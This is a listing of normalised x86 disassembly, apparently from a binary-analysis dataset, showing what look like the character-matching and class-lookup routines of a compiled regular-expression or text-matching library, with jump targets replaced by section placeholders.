mov eax [ edi + 0x2c ]
add eax 0x8
push ecx
push eax
call sub_419e2c
cmp [ esi + 0x2 ] al
je r-xdata
mov [ edi + 0x1d ] 0x1
jmp r-xdata
xor al al
pop esi
retn
inc [ edi ]
mov eax [ ebx ]
push edi
mov ecx ebx
call [ eax + 0x4 ]
test al al
je r-xdata
dec [ edi ]
mov al 0x1
pop esi
retn
sub_419188
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
inc eax
mov [ esi ] eax
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
dec [ esi ]
mov al 0x1
retn
xor al al
retn
sub_4191bc
push ebp
mov ebp esp
mov edx [ eax ]
push ebx
cmp edx [ eax + 0xc ]
jne r-xdata
mov bl [ edx - 0x1 ]
push edi
mov edi [ eax + 0x2c ]
movzx ecx bl
mov cx [ edi + ecx * 2 + 0x8 ]
and cx [ esi ]
xor edi edi
cmp di cx
pop edi
je r-xdata
cmp [ eax + 0x16 ] 0x0
xor al al
jmp r-xdata
cmp bl [ esi + 0x3 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
pop ebx
pop ebp
retn 0x4
cmp edx [ eax + 0x10 ]
jne r-xdata
mov cl [ edx ]
cmp cl [ esi + 0x2 ]
jmp r-xdata
mov [ eax + 0x1d ] 0x1
jne r-xdata
sub_41921d
push ebp
mov ebp esp
mov edx [ eax ]
push ebx
cmp edx [ eax + 0x10 ]
jne r-xdata
mov bl [ edx ]
push edi
mov edi [ eax + 0x2c ]
movzx ecx bl
mov cx [ edi + ecx * 2 + 0x8 ]
and cx [ esi ]
xor edi edi
cmp di cx
pop edi
je r-xdata
cmp [ eax + 0x17 ] 0x0
mov [ eax + 0x1d ] 0x1
xor al al
jmp r-xdata
cmp bl [ esi + 0x2 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push eax
call [ edx + 0x4 ]
pop ebx
pop ebp
retn 0x4
cmp edx [ eax + 0xc ]
jne r-xdata
mov cl [ edx - 0x1 ]
cmp cl [ esi + 0x3 ]
jmp r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
jne r-xdata
sub_419287
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
movzx edx [ eax ]
push ebx
mov ebx [ esi + 0x2c ]
mov dx [ ebx + edx * 2 + 0x8 ]
and dx [ ecx ]
xor ebx ebx
cmp bx dx
pop ebx
mov [ ebp - 0x4 ] 0x1
jne r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
cmp eax [ esi + 0xc ]
jne r-xdata
mov [ ebp - 0x4 ] 0x0
movzx eax [ eax - 0x1 ]
mov edx [ esi + 0x2c ]
mov ax [ edx + eax * 2 + 0x8 ]
and ax [ ecx ]
xor ecx ecx
mov [ ebp - 0x8 ] 0x1
cmp cx ax
jne r-xdata
cmp [ esi + 0x15 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
mov eax esi
push [ ebp - 0x8 ]
call sub_41b798
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
xor eax eax
leave
retn
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
xor eax eax
inc eax
leave
retn
sub_41931b
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
movzx edx [ eax ]
push ebx
mov ebx [ esi + 0x2c ]
mov dx [ ebx + edx * 2 + 0x8 ]
and dx [ ecx ]
xor ebx ebx
cmp bx dx
pop ebx
mov [ ebp - 0x4 ] 0x1
jne r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
cmp eax [ esi + 0xc ]
jne r-xdata
mov [ ebp - 0x4 ] 0x0
movzx eax [ eax - 0x1 ]
mov edx [ esi + 0x2c ]
mov ax [ edx + eax * 2 + 0x8 ]
and ax [ ecx ]
xor ecx ecx
mov [ ebp - 0x8 ] 0x1
cmp cx ax
jne r-xdata
cmp [ esi + 0x15 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
mov eax esi
push [ ebp - 0x8 ]
call sub_41b7ca
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
xor eax eax
leave
retn
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
xor eax eax
inc eax
leave
retn
sub_4193af
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
movzx edx [ eax ]
push ebx
mov ebx [ esi + 0x2c ]
mov dx [ ebx + edx * 2 + 0x8 ]
and dx [ ecx ]
xor ebx ebx
cmp bx dx
pop ebx
mov [ ebp - 0x4 ] 0x1
jne r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
cmp eax [ esi + 0xc ]
jne r-xdata
mov [ ebp - 0x4 ] 0x0
movzx eax [ eax - 0x1 ]
mov edx [ esi + 0x2c ]
mov ax [ edx + eax * 2 + 0x8 ]
and ax [ ecx ]
xor ecx ecx
mov [ ebp - 0x8 ] 0x1
cmp cx ax
jne r-xdata
cmp [ esi + 0x15 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
mov eax esi
push [ ebp - 0x8 ]
call sub_41b7fc
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
xor eax eax
leave
retn
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
xor eax eax
inc eax
leave
retn
sub_419443
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
movzx edx [ eax ]
push ebx
mov ebx [ esi + 0x2c ]
mov dx [ ebx + edx * 2 + 0x8 ]
and dx [ ecx ]
xor ebx ebx
cmp bx dx
pop ebx
mov [ ebp - 0x4 ] 0x1
jne r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
cmp eax [ esi + 0xc ]
jne r-xdata
mov [ ebp - 0x4 ] 0x0
movzx eax [ eax - 0x1 ]
mov edx [ esi + 0x2c ]
mov ax [ edx + eax * 2 + 0x8 ]
and ax [ ecx ]
xor ecx ecx
mov [ ebp - 0x8 ] 0x1
cmp cx ax
jne r-xdata
cmp [ esi + 0x15 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
mov eax esi
push [ ebp - 0x8 ]
call sub_41b824
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
xor eax eax
leave
retn
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
xor eax eax
inc eax
leave
retn
sub_4194d7
push ebp
mov ebp esp
sub esp 0x10
push edi
mov edi eax
mov eax [ edi ]
cmp eax [ esi + 0x8 ]
jl r-xdata
mov eax [ edi ]
imul eax eax 0x18
add eax [ esi + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0x2e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov ecx [ esi ]
mov edi [ eax ]
push ebx
mov ebx [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
xor al al
jmp r-xdata
cmp edi ebx
jne r-xdata
pop edi
leave
retn 0x4
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
mov al [ eax ]
mov [ ebp - 0xc ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0xc ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x1 ] al
mov al [ edi ]
mov [ ebp - 0x10 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x10 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x1 ] al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
xor al al
mov al 0x1
jmp r-xdata
inc edi
inc [ esi ]
pop ebx
sub_419594
push ebp
mov ebp esp
push edi
mov edi eax
mov eax [ edi ]
cmp eax [ esi + 0x8 ]
jl r-xdata
mov eax [ edi ]
imul eax eax 0x18
add eax [ esi + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0x2e
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov edx [ eax ]
mov edi [ eax + 0x4 ]
push ebx
mov ebx [ esi ]
jmp r-xdata
xor al al
jmp r-xdata
cmp edx edi
jne r-xdata
pop edi
pop ebp
retn 0x4
mov ecx [ esi ]
cmp ecx [ esi + 0x10 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
mov al [ ecx ]
cmp al [ edx ]
jne r-xdata
xor al al
mov [ esi ] ebx
mov al 0x1
jmp r-xdata
inc edx
inc ecx
mov [ esi ] ecx
pop ebx
sub_41961b
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
mov al [ eax ]
mov [ ebp - 0x4 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov ecx [ ebp + 0x8 ]
cmp al [ ecx ]
jne r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
xor al al
inc [ esi ]
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
dec [ esi ]
mov al 0x1
jmp r-xdata
leave
retn 0x4
sub_419664
push ebp
mov ebp esp
push esi
mov esi eax
call sub_411426
mov ecx [ esi ]
push eax
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
push eax
mov al 0x1
call sub_41b74f
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn 0x8
sub_419688
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
mov dl [ eax ]
cmp dl [ edi ]
jne r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
xor al al
retn
inc eax
mov [ esi ] eax
mov eax [ ecx ]
push esi
call [ eax + 0x4 ]
test al al
je r-xdata
dec [ esi ]
mov al 0x1
retn
sub_4196b1
push ebp
mov ebp esp
push esi
mov esi eax
call sub_411426
mov ecx [ esi ]
push eax
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
push eax
xor al al
call sub_41b74f
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn 0x8
sub_4196d5
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
movzx ecx [ eax ]
push ebx
mov ebx [ esi + 0x2c ]
mov cx [ ebx + ecx * 2 + 0x8 ]
and cx [ edx + 0x2 ]
xor ebx ebx
cmp bx cx
setne cl
pop ebx
cmp [ edx ] cl
je r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
xor al al
retn
inc eax
mov [ esi ] eax
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x4 ]
test al al
je r-xdata
dec [ esi ]
mov al 0x1
retn
sub_419717
push ebp
mov ebp esp
push esi
mov esi eax
call sub_411426
push eax
movzx eax [ edi ]
push eax
movzx eax [ edi + 0x2 ]
push eax
push [ esi ]
call sub_41b850
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn 0x4
sub_41973b
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push edi
mov edi eax
push edi
lea eax [ ebp - 0x8 ]
call sub_409874
mov ecx [ edi + 0x8 ]
cmp ecx [ eax ]
je r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
push 0x36
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov eax [ edi + 0x8 ]
cmp [ eax + 0x2c ] 0x0
push 0x37
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0xd
push eax
call sub_403978
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edi [ edi + 0x8 ]
add esp 0x18
call sub_41b88f
pop edi
pop esi
leave
retn 0x8
call sub_40379c
sub_4197c7
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push edi
xor eax eax
lea edi [ esp + 0x4 ]
stosb [ edi ]
push [ esp + 0x4 ]
push [ ebp + 0xc ]
cmp [ ecx + 0x5 ] al
jne r-xdata
mov edi [ ebp + 0x8 ]
call sub_41b8de
push ecx
mov ecx [ ebp + 0x8 ]
call sub_41b984
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_41981d
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
cmp [ ecx + 0x5 ] al
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax ecx
call sub_41babe
push ecx
mov ecx [ ebp + 0x8 ]
call sub_41bb77
jmp r-xdata
pop edi
leave
retn 0x8
sub_41986e
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov edi [ ebp + 0x8 ]
call sub_41bd76
mov eax [ ebp + 0x8 ]
push esi
call sub_41bda7
jmp r-xdata
pop edi
pop esi
leave
retn 0x8
sub_4198f8
push 0xa0
mov eax sub_44dd3f
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov edi [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
mov eax [ eax ]
mov esi edx
push [ esi + 0x4 ]
push ecx
je r-xdata
lea ecx [ ebp - 0x44 ]
call sub_41a589
lea eax [ ebp - 0x90 ]
push eax
lea edi [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x2
call sub_41bed1
pop ecx
mov ebx eax
mov [ ebp - 0x4 ] 0x3
call sub_406dc4
lea eax [ ebp - 0x90 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_4069e4
mov ecx edi
lea ecx [ ebp - 0x74 ]
call sub_41a50a
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xac ]
push eax
lea edi [ ebp - 0x74 ]
call sub_41be62
pop ecx
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0xac ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_4069e4
mov ecx edi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
call sub_40487c
call sub_448681
retn
sub_4199a5
push 0xa0
mov eax sub_44dced
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov edi [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
mov eax [ eax ]
mov esi edx
push [ esi + 0x4 ]
push ecx
je r-xdata
lea ecx [ ebp - 0x44 ]
call sub_41a687
lea eax [ ebp - 0x90 ]
push eax
lea edi [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x2
call sub_41bfaf
pop ecx
mov ebx eax
mov [ ebp - 0x4 ] 0x3
call sub_406dc4
lea eax [ ebp - 0x90 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_4069e4
mov ecx edi
lea ecx [ ebp - 0x74 ]
call sub_41a608
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xac ]
push eax
lea edi [ ebp - 0x74 ]
call sub_41bf40
pop ecx
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0xac ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_4069e4
mov ecx edi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
call sub_40487c
call sub_448681
retn
sub_419a52
push 0x4c
mov eax sub_44bc27
call sub_448595
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
mov ebx [ edi + 0x4 ]
mov eax [ eax ]
lea esi [ ebp - 0x20 ]
je r-xdata
call sub_41a787
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_41c084
pop ecx
pop ecx
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x58 ]
call sub_41a706
mov eax esi
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_41c01e
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
mov ebx eax
mov esi edi
call sub_406dc4
lea eax [ ebp - 0x3c ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push eax
call sub_4069e4
call sub_44866d
retn
sub_419ace
push 0x4c
mov eax sub_44bbf8
call sub_448595
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
mov ebx [ edi + 0x4 ]
mov eax [ eax ]
lea esi [ ebp - 0x20 ]
je r-xdata
call sub_41a889
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_41c150
pop ecx
pop ecx
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x58 ]
call sub_41a808
mov eax esi
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_41c0ea
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
mov ebx eax
mov esi edi
call sub_406dc4
lea eax [ ebp - 0x3c ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push eax
call sub_4069e4
call sub_44866d
retn
sub_419b4a
push 0x4c
mov eax sub_44bbc9
call sub_448595
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
mov ebx [ edi + 0x4 ]
mov eax [ eax ]
lea esi [ ebp - 0x20 ]
je r-xdata
call sub_41a980
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_41c21c
pop ecx
pop ecx
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x58 ]
call sub_41a90a
mov eax esi
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_41c1b6
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
mov ebx eax
mov esi edi
call sub_406dc4
lea eax [ ebp - 0x3c ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push eax
call sub_4069e4
call sub_44866d
retn
sub_419bc6
push 0x4c
mov eax sub_44bb9a
call sub_448595
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
mov ebx [ edi + 0x4 ]
mov eax [ eax ]
lea esi [ ebp - 0x20 ]
je r-xdata
call sub_41aa77
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_41c2e8
pop ecx
pop ecx
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x58 ]
call sub_41a9f6
mov eax esi
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_41c282
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
mov ebx eax
mov esi edi
call sub_406dc4
lea eax [ ebp - 0x3c ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push eax
call sub_4069e4
call sub_44866d
retn
sub_419c42
push 0x4c
mov eax sub_44bb6b
call sub_448595
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
mov ebx [ edi + 0x4 ]
mov eax [ eax ]
lea esi [ ebp - 0x20 ]
je r-xdata
call sub_41ab79
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_41c3b4
pop ecx
pop ecx
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x58 ]
call sub_41aaf8
mov eax esi
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_41c34e
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
mov ebx eax
mov esi edi
call sub_406dc4
lea eax [ ebp - 0x3c ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push eax
call sub_4069e4
call sub_44866d
retn
sub_419cbe
push 0x4c
mov eax sub_44bb3c
call sub_448595
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
mov ebx [ edi + 0x4 ]
mov eax [ eax ]
lea esi [ ebp - 0x20 ]
je r-xdata
call sub_41ac7b
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_41c480
pop ecx
pop ecx
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x58 ]
call sub_41abfa
mov eax esi
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_41c41a
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
mov ebx eax
mov esi edi
call sub_406dc4
lea eax [ ebp - 0x3c ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push eax
call sub_4069e4
call sub_44866d
retn
sub_419d58
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0x7fffffff
ja r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4252f8
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_426f77
add eax eax
push eax
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
leave
retn
sub_419dc1
cmp ecx 0x100
jb r-xdata
mov eax ecx
shr eax 0x6
push esi
lea esi [ edi + eax * 8 ]
xor eax eax
and ecx 0x3f
inc eax
xor edx edx
call sub_449ca0
or [ esi ] eax
or [ esi + 0x4 ] edx
mov eax edi
pop esi
retn
push r--data
call sub_446ae2
sub_419e2c
push ebp
mov ebp esp
cmp [ esi + 0x3 ] 0x0
mov al [ ebp + 0xc ]
push edi
lea edi [ esi + 0x2 ]
je r-xdata
mov ecx esi
cmp esi edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x204 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x8 ]
xor eax eax
cmp edi ecx
setne al
pop edi
pop ebp
retn 0x8
cmp [ ecx ] al
je r-xdata
inc ecx
cmp ecx edi
jne r-xdata
sub_41a163
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41a207
push esi
push edi
push 0x8
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x28 ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41a23a
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x28 ]
call sub_407804
mov esi [ ebp + 0x8 ]
add edi 0x8
mov ebx eax
call sub_41c559
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41a273
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp + 0xb ]
push ecx
push [ ebp + 0x8 ]
call sub_41c5a5
pop ebp
retn 0x4
sub_41a2d1
push esi
push edi
push 0x8
pop ecx
mov esi eax
lea edi [ ebx + 0x8 ]
[ edi ] [ esi ]
and [ ebx + 0x4 ] 0x0
mov [ ebx ] r--data
call sub_40dcdf
mov eax [ eax ]
pop edi
mov [ ebx + 0x28 ] eax
pop esi
test eax eax
je r-xdata
mov eax ebx
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41a304
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x28 ]
call sub_407804
mov esi [ ebp + 0x8 ]
add edi 0x8
mov ebx eax
call sub_41c5f1
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41a33d
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp + 0xb ]
push ecx
push [ ebp + 0x8 ]
call sub_41c621
pop ebp
retn 0x4
sub_41a39b
push ebx
lea ebx [ esi + 0x8 ]
call sub_416f3f
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x40 ] eax
pop ebx
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41a3ca
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x40 ]
call sub_407804
mov ebx [ ebp + 0x8 ]
push eax
add edi 0x8
push edi
call sub_41c66d
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41a452
push ebx
lea ebx [ esi + 0x8 ]
call sub_416f3f
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x40 ] eax
pop ebx
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_41a481
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x40 ]
call sub_407804
mov esi [ ebp + 0x8 ]
add edi 0x8
push edi
mov ebx eax
call sub_41c6ce
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41a50a
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov ebx eax
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x20 ] ebx
cmp ebx edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] 0x0
mov ebx r--data
jbe r-xdata
test edi edi
jne r-xdata
push 0x4f
push ebx
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x50
push ebx
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push ebx
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0xc ] 0x3ffffffe
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41a589
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov ebx eax
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x20 ] ebx
cmp ebx edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] 0x0
mov ebx r--data
jbe r-xdata
test edi edi
jne r-xdata
push 0x4f
push ebx
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x50
push ebx
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push ebx
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0xc ] 0x3ffffffe
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41a608
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov ebx eax
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x20 ] ebx
cmp ebx edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] 0x0
mov ebx r--data
jbe r-xdata
test edi edi
jne r-xdata
push 0x4f
push ebx
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x50
push ebx
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push ebx
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0xc ] 0x3ffffffe
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41a687
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov ebx eax
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x20 ] ebx
cmp ebx edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] 0x0
mov ebx r--data
jbe r-xdata
test edi edi
jne r-xdata
push 0x4f
push ebx
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x50
push ebx
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push ebx
push r--data
call sub_4258e2
add esp 0xc
cmp [ ebp + 0xc ] 0x3ffffffe
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_41a706
push ebp
mov ebp esp
mov cl [ ecx ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] cl
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
